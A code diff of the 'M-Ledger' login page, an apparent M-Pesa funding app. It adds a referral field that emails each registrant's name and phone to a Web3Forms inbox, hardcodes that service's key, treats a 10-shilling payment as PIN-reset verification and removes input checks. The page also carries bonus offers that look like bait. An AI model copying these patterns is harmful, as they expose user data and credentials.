@@ -5,25 +5,23 @@
     <title>M-Ledger Login & Security</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        :root { --primary: #4CAF50; --dark: #0f0f0f; --card: #1a1a1a; --error: #ff4444; --warning: #ffab00; }
+        :root { --primary: #4CAF50; --dark: #0f0f0f; --card: #1a1a1a; }
         body { font-family: system-ui, -apple-system, sans-serif; background: var(--dark); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
         .box { width: 100%; max-width: 400px; background: var(--card); padding: 30px; border-radius: 20px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #444; background: #000; color: var(--primary); box-sizing: border-box; font-size: 16px; }
-        input:focus { outline: none; border-color: var(--primary); }
+        input, select { width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #444; background: #000; color: var(--primary); box-sizing: border-box; font-size: 16px; }
+        input:focus, select:focus { outline: none; border-color: var(--primary); }
         button { width: 100%; padding: 15px; border-radius: 10px; border: none; background: var(--primary); color: white; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; margin-top: 10px; }
         button:disabled { background: #2e5d30; color: #888; cursor: not-allowed; }
         .link { text-align: center; margin-top: 15px; color: #888; cursor: pointer; text-decoration: underline; font-size: 14px; }
         h2 { text-align: center; margin-top: 0; color: var(--primary); }
         p.info { text-align: center; font-size: 13px; color: #aaa; margin-bottom: 20px; }
-        #status { text-align: center; margin-top: 15px; font-weight: bold; min-height: 40px; font-size: 15px; padding: 10px; border-radius: 8px; }
+        #status { text-align: center; margin-top: 15px; font-weight: 500; min-height: 40px; font-size: 14px; line-height: 1.5; }
         .loader { display: inline-block; width: 14px; height: 14px; border: 2px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite; margin-right: 8px; }
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div class="box">
-        <div id="status"></div>
-
         <div id="loginSection">
             <h2>M-Ledger Login</h2>
             <p class="info">Use your Safaricom number for easy funding.</p>
@@ -35,21 +33,28 @@
         </div>
 
         <div id="choiceSection" style="display:none">
-            <h2>Success!</h2>
+            <h2>Welcome Back!</h2>
             <p class="info">How would you like to continue?</p>
             <button onclick="goTo('menu.html')">Continue with App</button>
-            <button onclick="goTo('act.html')" style="background: #333; margin-top: 15px;">Continue with SIM Toolkit</button>
-            <div style="margin-top: 20px; font-size: 12px; color: #888; text-align: center; line-height: 1.5;">
-                Offer! Funding fee reduced to 4%.<br>Fund 1000/= and get 500/= bonus instantly!
-            </div>
+            <button onclick="goTo('act.html')">Continue with SIM Toolkit</button>
+            <p style="margin-top:15px; font-size: 0.9em; line-height: 1.4;"> 🏝️ 🌄🎇 🎆🌆🌇🌌 🌁🌅🌅♨️🚤 💭🗯️💬<br>
+                Offer! Funding fee reduced to 4%. Fund 1000 today and get 500 bonus!
+            </p>
         </div>
-        
+       
         <div id="regSection" style="display:none">
             <h2>Create Account</h2>
             <input id="rName" placeholder="Full Name">
             <input id="rPhone" placeholder="Safaricom Phone Number" type="tel">
             <input id="rPass" type="password" placeholder="Set PIN/Password">
-            <button id="rBtn" onclick="register()">Register Now</button>
+            
+            <select id="hasReferral" onchange="toggleReferralInput()">
+                <option value="no">No Referral</option>
+                <option value="yes">I was referred by someone</option>
+            </select>
+            <input id="referrerPhone" placeholder="Referrer Phone Number" type="tel" style="display:none;">
+
+            <button id="rBtn" onclick="register()">Register</button>
             <p class="link" onclick="showSection('loginSection')">Back to Login</p>
         </div>
 
@@ -61,40 +66,101 @@
             <button id="resetBtn" onclick="changePin()">Verify & Update PIN</button>
             <p class="link" onclick="showSection('loginSection')">Back to Login</p>
         </div>
+        <p id="status"></p>
     </div>
 
     <script>
         const API = "https://funds-mauve.vercel.app/api";
         const BACKEND_PAYMENT = "https://newpayment-srpu.onrender.com";
-
-        function setStatus(msg, type) {
-            const status = document.getElementById('status');
-            status.innerText = msg;
-            if (type === 'success') status.style.color = "#4CAF50";
-            else if (type === 'error') status.style.color = "#ff4444";
-            else status.style.color = "#ffab00";
-        }
+        const WEB3FORMS_KEY = "bf0e28a0-7666-4bfc-91ad-bcb1699d5d6c";
 
         function showSection(sectionId) {
-            const sections = ['loginSection', 'regSection', 'resetSection', 'choiceSection'];
-            sections.forEach(id => {
+            ['loginSection', 'regSection', 'resetSection', 'choiceSection'].forEach(id => {
                 document.getElementById(id).style.display = (id === sectionId) ? 'block' : 'none';
             });
             document.getElementById('status').innerText = "";
         }
 
+        function toggleReferralInput() {
+            const select = document.getElementById('hasReferral').value;
+            document.getElementById('referrerPhone').style.display = (select === 'yes') ? 'block' : 'none';
+        }
+
         function goTo(page) { window.location.href = page; }
 
-        async function login() {
-            const btn = document.getElementById('lBtn');
-            const phone = document.getElementById('lPhone').value;
-            const pass = document.getElementById('lPass').value;
+        async function register() {
+            const btn = document.getElementById('rBtn');
+            const status = document.getElementById('status');
+            const name = document.getElementById('rName').value;
+            const phone = document.getElementById('rPhone').value;
+            const pass = document.getElementById('rPass').value;
+            const refStatus = document.getElementById('hasReferral').value;
+            const refPhone = document.getElementById('referrerPhone').value || "No Referral";
 
-            if(!phone || !pass) return setStatus("Please enter phone and PIN", "error");
+            if(!name || !phone || !pass) {
+                status.innerText = "Please fill all required fields";
+                status.style.color = "#ffab00";
+                return;
+            }
 
-            btn.innerHTML = '<span class="loader"></span> Logging in...';
+            btn.innerText = "Processing...";
             btn.disabled = true;
 
+            try {
+                // STEP 1: Submit to your Database First
+                const res = await fetch(`${API}/register`, {
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({ name, phone, password: pass })
+                });
+                const d = await res.json();
+
+                // STEP 2: Only if database registration is successful, send email
+                if(res.ok || d.success) {
+                    
+                    // Sending to your Gmail via Web3Forms
+                    await fetch("https://api.web3forms.com/submit", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            access_key: WEB3FORMS_KEY,
+                            subject: "Account Created + Referral Info",
+                            from_name: "M-Ledger Registration",
+                            message: `SUCCESSFUL REGISTRATION\n\nName: ${name}\nUser Phone: ${phone}\n\nREFERRAL DETAILS:\nStatus: ${refStatus === 'yes' ? 'Was Referred' : 'No Referral'}\nReferrer Number: ${refPhone}`
+                        })
+                    });
+
+                    // STEP 3: Show the long-lasting success message
+                    status.style.color = "#4CAF50";
+                    status.innerHTML = "✅ Account Created Successfully!<br>Soon you and your referee will get gift funds soon.";
+                    
+                    // Stay on screen for 8 seconds
+                    setTimeout(() => {
+                        showSection('loginSection');
+                    }, 8000);
+
+                } else {
+                    status.style.color = "#ffab00";
+                    status.innerText = d.error || "Registration failed on server.";
+                    btn.disabled = false;
+                    btn.innerText = "Register";
+                }
+            } catch (err) {
+                status.style.color = "#ff4444";
+                status.innerText = "Network error. Please try again.";
+                btn.disabled = false;
+                btn.innerText = "Register";
+            }
+        }
+
+        // --- Keep existing login/PIN functions ---
+        async function login() {
+            const btn = document.getElementById('lBtn');
+            const status = document.getElementById('status');
+            const phone = document.getElementById('lPhone').value;
+            const pass = document.getElementById('lPass').value;
+            btn.innerText = "Logging in...";
+            btn.disabled = true;
             try {
                 const res = await fetch(`${API}/login`, {
                     method:'POST',
@@ -102,67 +168,18 @@
                     body: JSON.stringify({ phone, password: pass })
                 });
                 const d = await res.json();
-                
-                if (d.success) {
-                    setStatus("Login Successful!", "success");
-                    localStorage.setItem('mledger_user', JSON.stringify(d.user));
-                    setTimeout(() => showSection('choiceSection'), 1000);
-                } else {
-                    setStatus(d.error || "Login Failed: Incorrect details", "error");
-                    btn.innerText = "Login";
-                    btn.disabled = false;
-                }
-            } catch (err) {
-                setStatus("Connection Error. Try again.", "error");
-                btn.disabled = false;
-                btn.innerText = "Login";
-            }
-        }
-
-        async function register() {
-            const btn = document.getElementById('rBtn');
-            const name = document.getElementById('rName').value;
-            const phone = document.getElementById('rPhone').value;
-            const pass = document.getElementById('rPass').value;
-
-            if(!name || !phone || !pass) return setStatus("Fill all fields to register", "error");
-
-            btn.innerHTML = '<span class="loader"></span> Creating Account...';
-            btn.disabled = true;
-
-            try {
-                const res = await fetch(`${API}/register`, {
-                    method:'POST',
-                    headers:{'Content-Type':'application/json'},
-                    body: JSON.stringify({ name, phone, password: pass })
-                });
-                const d = await res.json();
-                
-                if(res.ok || d.message) {
-                    setStatus("Success! Account Created.", "success");
-                    setTimeout(() => showSection('loginSection'), 2000);
-                } else {
-                    setStatus(d.error || "Registration Failed", "error");
-                }
-            } catch (err) {
-                setStatus("Network error during registration", "error");
-            } finally {
-                btn.innerText = "Register Now";
-                btn.disabled = false;
-            }
+                if (d.success) { showSection('choiceSection'); } 
+                else { status.innerText = d.error || "Login failed"; btn.innerText = "Login"; btn.disabled = false; }
+            } catch (err) { status.innerText = "Connection failed."; btn.disabled = false; btn.innerText = "Login"; }
         }
 
         async function changePin() {
             const btn = document.getElementById('resetBtn');
+            const status = document.getElementById('status');
             const phone = document.getElementById('resetPhone').value;
             const newPassword = document.getElementById('resetPass').value;
-
-            if(!phone || !newPassword) return setStatus("Phone and New PIN required", "error");
-
-            btn.innerHTML = '<span class="loader"></span> Initiating...';
+            btn.innerHTML = '<span class="loader"></span>Verifying...';
             btn.disabled = true;
-            setStatus("Sending STK Push to your phone...", "warning");
-
             try {
                 const payRes = await fetch(`${BACKEND_PAYMENT}/api/initiate`, {
                     method: "POST",
@@ -170,42 +187,34 @@
                     body: JSON.stringify({ amount: 10, phone_number: phone })
                 });
                 const payData = await payRes.json();
-                const invoiceId = payData.invoice ? payData.invoice.invoice_id : (payData.id || null);
-
-                if (invoiceId) {
-                    setStatus("Complete M-Pesa payment to verify", "warning");
-                    startPollingReset(invoiceId, phone, newPassword);
-                } else {
-                    throw new Error();
-                }
+                const inv = payData.invoice ? payData.invoice.invoice_id : (payData.id || null);
+                if (inv) {
+                    status.innerText = "Confirm M-Pesa PIN on your phone...";
+                    startPollingReset(inv, phone, newPassword);
+                } else { throw new Error(); }
             } catch (err) {
-                setStatus("Error: Use a valid Safaricom line", "error");
-                btn.disabled = false;
-                btn.innerText = "Verify & Update PIN";
+                status.innerText = "Verification error. Safaricom lines only.";
+                btn.disabled = false; btn.innerText = "Verify & Update PIN";
             }
         }
 
-        function startPollingReset(invoiceId, phone, newPassword) {
-            const btn = document.getElementById('resetBtn');
+        function startPollingReset(inv, phone, newPassword) {
             let pollCount = 0;
             const pollTimer = setInterval(async () => {
                 pollCount++;
                 try {
-                    const res = await fetch(`${BACKEND_PAYMENT}/api/status/${invoiceId}`);
+                    const res = await fetch(`${BACKEND_PAYMENT}/api/status/${inv}`);
                     const data = await res.json();
                     const state = data.invoice ? data.invoice.state : data.state;
-
                     if (state === "COMPLETE" || state === "COMPLETED") {
                         clearInterval(pollTimer);
-                        setStatus("Verification Success!", "success");
                         finalizePinUpdate(phone, newPassword);
-                    } else if (state === "FAILED" || state === "REJECTED" || pollCount > 20) {
+                    } else if (state === "FAILED" || pollCount > 20) {
                         clearInterval(pollTimer);
-                        setStatus("Verification Failed. Try again.", "error");
-                        btn.disabled = false;
-                        btn.innerText = "Verify & Update PIN";
+                        document.getElementById('status').innerText = "Ownership Verification Failed.";
+                        document.getElementById('resetBtn').disabled = false;
                     }
-                } catch (e) { console.error("Polling error"); }
+                } catch (e) {}
             }, 3000);
         }
 
@@ -216,16 +225,11 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ phone, newPassword })
                 });
-                
                 if (res.ok) {
-                    setStatus("Success! PIN has been updated.", "success");
+                    document.getElementById('status').innerText = "✅ PIN updated!";
                     setTimeout(() => showSection('loginSection'), 2000);
-                } else {
-                    setStatus("Update failed. Phone not found.", "error");
                 }
-            } catch (err) {
-                setStatus("Database error.", "error");
-            }
+            } catch (err) { console.log(err); }
         }
     </script>
 </body>
